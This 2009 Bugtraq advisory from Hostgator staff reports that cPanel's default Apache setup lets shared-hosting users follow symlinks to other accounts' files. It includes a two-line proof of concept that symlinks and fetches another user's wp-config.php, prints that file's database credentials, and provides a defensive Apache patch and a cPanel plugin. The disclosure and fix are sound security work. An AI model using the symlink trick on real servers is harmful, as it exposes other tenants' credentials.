@@ -1,0 +1,164 @@
+
+Date: 19 Feb 2009 05:48:18 -0000
+From: davec@...tgator.com
+To: bugtraq@...urityfocus.com
+Subject: Apache directory traversal on shared hosting environment.
+
+Apache implementation directory traversal and sensitive file disclosure in Shared Hosting environment.
+
+Chris Dixon and David Ibarra of the Hostgator.com Support Team discovered a severe vulnerability exists specifically in several large 
+scale "pre-packaged" Apache implementations such as cPanel which allows a user to traverse directories and view any file which has readable 
+access by the webserver. Our proof of concept demonstrates exploitation via a symlink in a chrooted jailed shell. This can be disabled by enabling the 
+SymLinksIfOwnerMatch option in Apache however you must also change the AllowOverride default options as well. We also provide an Apache patch 
+which can be implemented directly via an easyapache hook in order to disallow symlinks followed by anyone other than their owners.
+
+cPanel developers were notified of this vulnerability and given time to hotfix the issue.
+
+Their response was:
+
+After thoroughly investigating your report, we have come to the conclusion that this does not represent any deviation from the intended and documented behavior of Apache. As noted in your report, Apache's behavior with regard to symlinks is easily configurable via the FollowSymlinks and SymLinksIfOwnerMatch options. These settings can be changed inside WHM via Service Configuration -> Apache Configuration -> Global Configuration.  Simply uncheck "FollowSymLinks" in the "Directory / Options" section, save your settings and rebuild the configuration and restart Apache. Disabling "Options" overrides can be done via the Apache include editor by specifying an AllowOverride setting for the /home directory.
+
+While this is true, it should be noted that the default configuration in cPanel is readily exploitable after installation and that toggling these setting will ultimately cause issues with several large popular blog and CMS type applications. We feel this does not properly address the vulnerability in terms of a shared hosting environment.
+
+The patch is provided by David Collins (CTO, Hostgator.com) and Ray Carro (Developer, Hostgator.com).
+
+A symlink is created to another users wordpress configuration, which does not even exist in the chroot, resulting in a broken, unreadable symlink.
+
+dcarey@...wcarey.com [~/public_html]# ln -s /home/bbarker/public_html/wp-config.php vuln
+dcarey@...wcarey.com [~/public_html]# ls -lsah
+total 20K
+4.0K drwxr-x--- 3 dcarey nobody 4.0K Feb 17 22:25 ./
+4.0K drwxr-xr-x 9 dcarey dcarey 4.0K Feb 17 22:23 ../
+4.0K drwxr-xr-x 2 dcarey dcarey 4.0K Feb 17 22:17 cgi-bin/
+8.0K -rw-r--r-- 1 dcarey dcarey 4.1K Feb 10 18:16 default.html
+   0 lrwxrwxrwx 1 dcarey dcarey   39 Feb 17 22:25 vuln -> /home/bbarker/public_html/wp-config.php
+
+However, when viewed via Apache our file is shown in full.
+
+dcarey@...wcarey.com [~/public_html]# GET localhost/~dcarey/vuln
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information by
+ * visiting {@...k http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'bbarker_wrdp1');
+
+/** MySQL database username */
+define('DB_USER', 'bbarker_wrdp1');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'tcdwzlbq42Eo');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+--continued--
+
+
+
+Patch files:
+
+The actual Apache source patch is included in FollowSymLinks_to_OwnerMatch.patch
+
+We are also including a custom easyapache plugin for cPanel servers in order to add this as an option in EA3.  The patch has only been tested on Apache 2.2.11.  Changes may need to be performed in order for it to function with other versions.
+
+/var/cpanel/easy/apache/custom_opt_mods/Cpanel/Easy/Apache/FollowSymLinks_to_OwnerMatch.patch
+/var/cpanel/easy/apache/custom_opt_mods/Cpanel/Easy/Apache/FollowSymLinks_to_OwnerMatch.pm
+
+--- CUT FollowSymLinks_to_OwnerMatch.patch ---
+--- httpd-2.2.11/server/core.c.old      2009-02-17 21:49:22.000000000 -0600
++++ httpd-2.2.11/server/core.c  2009-02-17 21:52:05.000000000 -0600
+@@ -1339,6 +1339,11 @@
+
+     (*opts) &= (~OPT_UNSET);
+
++       if( (*opts) & OPT_SYM_LINKS )
++       {
++               *opts &= ~OPT_SYM_LINKS;
++               *opts |= OPT_SYM_OWNER;
++       }
+     return NULL;
+ }
+
+@@ -1476,6 +1481,13 @@
+             d->opts |= opt;
+         }
+     }
++
++        if( (d->opts) & OPT_SYM_LINKS )
++        {
++                d->opts &= ~OPT_SYM_LINKS;
++                d->opts |= OPT_SYM_OWNER;
++        }
++
+
+     return NULL;
+ }
+--- CUT FollowSymLinks_to_OwnerMatch.patch ---
+( Direct link to patch http://69.93.178.39/FollowSymLinks_to_OwnerMatch.patch )
+
+
+--- CUT FollowSymLinks_to_OwnerMatch.pm ---
+# FollowSymLinks to OwnerMatch
+# written by: David Collins and Ray Carro, HostGator.com LLC
+
+package Cpanel::Easy::Apache::FollowSymLinks_to_OwnerMatch;
+
+our $easyconfig = {
+    'name'    => 'FollowSymLinks to SymLinksIfOwnerMatch',
+    'version' => '$Rev: 0001 $',
+    'hastargz' => 0,
+    'step'    => {
+        '0' => {
+            'name'    => 'Adding security patch for Apache',
+            'command' => sub {
+                my ($self) = @_;
+                return $self->apply_patch( '/var/cpanel/easy/apache/custom_opt_mods/Cpanel/Easy/Apache/FollowSymLinks_to_OwnerMatch.patch' );
+                my $added_to_apache = 0;
+                my $pns = 'Cpanel::Easy::Apache';
+                if ( $self->{'working_profile'}{$pns} ) {
+                    foreach my $spec ( $pns->versions() ) {
+                        if ( $self->{'working_profile'}{ $pns . '::' . $spec } ) {
+                            my @rc = $self->add_to_modify_later_queue( $pns . '::' . $spec, $apache_steps );
+                            $added_to_apache++ if $rc[0];
+                        }
+                    }
+                }
+                if ($added_to_apache) {
+                    return ( 1, 'Ok' );
+                }
+                else {
+                    return ( 0, 'Failed to patch Apache' );
+                }
+                return ( 1, 'Ok' );
+            },
+        },
+    },
+};
+
+1;
+--- CUT FollowSymLinks_to_OwnerMatch.pm ---
+(This perl module is optional for cPanel users for automatic hooking into easyapache)
+(Direct link to module http://69.93.178.39/FollowSymLinks_to_OwnerMatch.pm :: Place in /var/cpanel/easy/apache/custom_opt_mods/Cpanel/Easy/Apache/ along with patch.)
+
+Special thanks to: Patrick Pelanne for additional research along with the rest of the HG support team.
+
+NOTE: Hostgator.com is seeking qualified Linux administrators! Please send your resume to jobs@...tgator.com
